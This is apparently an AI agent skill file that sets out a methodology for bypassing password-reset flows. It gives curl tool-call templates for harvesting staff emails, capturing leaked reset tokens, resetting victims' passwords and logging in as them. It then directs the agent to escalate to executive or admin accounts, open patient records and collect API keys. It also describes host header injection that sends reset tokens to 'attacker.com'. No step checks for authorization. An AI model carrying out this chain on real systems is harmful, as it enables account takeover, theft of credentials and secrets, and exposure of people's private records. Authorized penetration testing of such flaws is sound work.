---
name: auth-bypass
description: Targeted methodology for authentication bypass and password reset flaws — check response-body token disclosure FIRST (most common, no header tricks needed), then host header injection, email leak via API/HTML scraping, and REST token manipulation. Always follow through to privilege escalation once a session is obtained.
---

# AUTHENTICATION BYPASS METHODOLOGY

When dealing with a password reset or "forgot password" auth flow, follow these exact steps to uncover logic flaws.

## 1. Tool Selection & Execution Strategy
**CRITICAL RULE:** For a directed authentication bypass or specific web endpoint task, **DO NOT waste time on infrastructure recon.**
- **DO NOT USE:** `subfinder`, `dnsx`, `naabu`, `nmap`, or any port scanning / DNS brute-forcing tools. These are completely irrelevant to a single-endpoint web application task and waste time.
- **DO USE:** 
  - `curl` for manual HTTP requests and checking headers/bodies.
  - `spider` or `katana` for discovering endpoints, content discovery, and finding leaked information (like emails in HTML).
  - Web interaction tools to scrape HTML, extract sensitive data, and send `POST` requests to authentication endpoints.
  
Keep it straightforward: Do the directed task using only the necessary web-layer tools.

## 2. Map the Complete Flow
- Identify the exact API endpoints used for the authentication flow, such as:
  - `/api/auth/forgot` or similar (POST)
  - `/api/auth/login` (POST)
  - `/api/auth/reset` or similar (POST/GET)
- Enumerate valid users. If the app returns a generic success message on forgot password but you don't know the target email, you MUST find the email.

## 3. Deep Content Scraping & API Inspection for Leaks
- Do not just rely on HTML responses or frontend scraping. Modern web applications and SPAs load content from backend APIs.
- **CRITICAL WORKFLOW:** When spidering discovers ANY API or content routes (e.g. `/api/posts`, `/api/articles`, `/api/users`, `/api/team`, `/api/news`), you MUST immediately `curl` those endpoints with `GET` to inspect their raw JSON output.
- JSON responses often contain complete internal user profiles, employee metadata, and staff email addresses (e.g., `author.email`, `user.email`). Always extract and use these real staff emails.

## 4. Response Body Token Disclosure (Check This First)
Before attempting complex out-of-band attacks, test for direct response-body token leaks:
- Send a `POST` request to the forgot-password endpoint (e.g., `/api/auth/forgot`) using `curl`:
  ```json
  {
    "tool": "curl",
    "args": {
      "url": "<target_base>/api/auth/forgot",
      "method": "POST",
      "headers": {"Content-Type": "application/json"},
      "json": {"email": "<harvested_employee_email>"}
    }
  }
  ```
- **Inspect the Full Response Body:** Check if the JSON response returns a `notification`, `preview`, `token`, `reset_url`, or token string (such as `prt_...`).
- **Complete the Account Takeover Chain:**
  1. **Reset Password:** If a token is leaked, immediately submit it to the reset endpoint:
     ```json
     {
       "tool": "curl",
       "args": {
         "url": "<target_base>/api/auth/reset",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
         "json": {"token": "<leaked_token>", "password": "NewSecurePassword123!"}
       }
     }
     ```
  2. **Authenticate:** Log in with the newly reset password:
     ```json
     {
       "tool": "curl",
       "args": {
         "url": "<target_base>/api/auth/login",
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
         "json": {"email": "<harvested_employee_email>", "password": "NewSecurePassword123!"}
       }
     }
     ```
  3. **Access Protected Surface:** Access the internal dashboard, patient records, or staff console to confirm full access.
- **Note on Enumeration-Safe Messages:** If a generic response like `{"ok":true,"message":"If an account exists..."}` is returned on random/fake emails, it does not mean the endpoint is safe. Real registered emails often return the full preview/notification object. Always test with harvested employee emails.

## 5. Once You Have a Session: Always Check for Escalation
Getting into ANY account via the flaws above is not the end of the task if the target says
"reach the admin console" / "take over an employee account" — it means you're not done yet.
- Check the authenticated user's own role/permissions (`/api/user/me` or similar) immediately
  after login.
- If the account you took over isn't privileged, look at what else the harvested identity data
  suggested (job titles, roles, or bio text implying elevated privilege, e.g. "Owner,"
  "Admin," "Manager," any C-level/leadership title) — that's a signal to specifically target
  THAT person's account with the forgot/reset chain above, not a random or first-found account.
  Never assume a specific name or title in advance — read it from what the target's own pages
  actually return.
- Once authenticated as a privileged user, check for further exposed secrets (API keys,
  internal config, storage bucket names/URLs) that a real business-impact report would need —
  these often appear directly in an admin-only API response once you're actually logged in.

## 6. Host Header Injection (if response-body disclosure isn't present)
If the application uses a REST API to send a password reset link to the user:
- How does the server know what domain to put in the reset link? It often uses the `Host` header from your HTTP request.
- **The Attack:** Intercept the forgot password request. Change the `Host` header to your own controlled server (e.g., `Host: attacker.com` or a webhook).
- When the server generates the email to the target, the reset link will point to `http://attacker.com/reset?token=XYZ`. 
- You receive the token on your server and can then use it on the real application to change the target's password.

## 7. The Direct-to-Server Reset Link Attack
Sometimes the backend is misconfigured to send the reset link *to the server's own logs* or to *the client response*, or the application blindly trusts the reset link generation.
- Initiating the forgot password flow for the leaked email might generate a backend reset link that is accessible or logged.
- **VULNERABILITY CHECK:** If the reset link is sent to the web server's own endpoint instead of an external email, you might be able to capture it if there's a misconfigured logging endpoint, or if you can manipulate the host header to point back to an endpoint you control or can view.
